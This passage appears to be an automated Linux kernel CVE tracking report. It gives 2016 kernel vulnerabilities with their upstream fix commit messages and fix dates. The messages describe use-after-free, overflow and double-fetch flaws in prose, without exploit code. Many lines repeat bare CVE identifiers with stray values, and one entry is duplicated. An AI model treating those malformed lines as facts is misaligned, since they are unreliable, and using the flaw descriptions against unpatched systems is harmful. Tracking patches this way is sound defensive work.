    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
